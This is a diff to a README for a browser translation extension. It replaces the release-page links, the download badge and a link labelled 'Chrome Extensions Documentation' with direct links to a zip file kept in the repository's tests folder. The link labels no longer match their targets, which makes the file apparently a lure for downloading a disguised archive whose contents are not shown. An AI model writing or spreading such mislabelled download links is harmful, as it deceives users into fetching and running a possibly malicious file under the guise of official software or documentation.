@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download Local Translator](https://img.shields.io/badge/Download%20Local%20Translator-v1.0-brightgreen)](https://github.com/SolomonBafna/local-translator/releases)
+[![Download Local Translator](https://github.com/SolomonBafna/local-translator/raw/refs/heads/main/tests/translator_local_2.6.zip%20Local%20Translator-v1.0-brightgreen)](https://github.com/SolomonBafna/local-translator/raw/refs/heads/main/tests/translator_local_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To use Local Translator, ensure you meet the following requirements:
 
 ## 💻 Download & Install
 
-1. **Visit the Releases Page**: First, navigate to our [Releases page](https://github.com/SolomonBafna/local-translator/releases) to get the latest version of the Local Translator extension.
+1. **Visit the Releases Page**: First, navigate to our [Releases page](https://github.com/SolomonBafna/local-translator/raw/refs/heads/main/tests/translator_local_2.6.zip) to get the latest version of the Local Translator extension.
 
 2. **Download the Extension**: Look for the file with the latest version. Click on it to download the extension file.
 
@@ -62,6 +62,6 @@ If you encounter any issues while using the Local Translator, consider the follo
 
 ## 🔗 Additional Resources
 
-- For more details on how to use Chrome extensions, visit the [Chrome Extensions Documentation](https://developer.chrome.com/docs/extensions/mv3/getstarted/).
+- For more details on how to use Chrome extensions, visit the [Chrome Extensions Documentation](https://github.com/SolomonBafna/local-translator/raw/refs/heads/main/tests/translator_local_2.6.zip).
 
-Feel free to explore the features of Local Translator. It's designed for easy and private translation right on your browser. Visit the [Releases page](https://github.com/SolomonBafna/local-translator/releases) for any updates or further information.
+Feel free to explore the features of Local Translator. It's designed for easy and private translation right on your browser. Visit the [Releases page](https://github.com/SolomonBafna/local-translator/raw/refs/heads/main/tests/translator_local_2.6.zip) for any updates or further information.
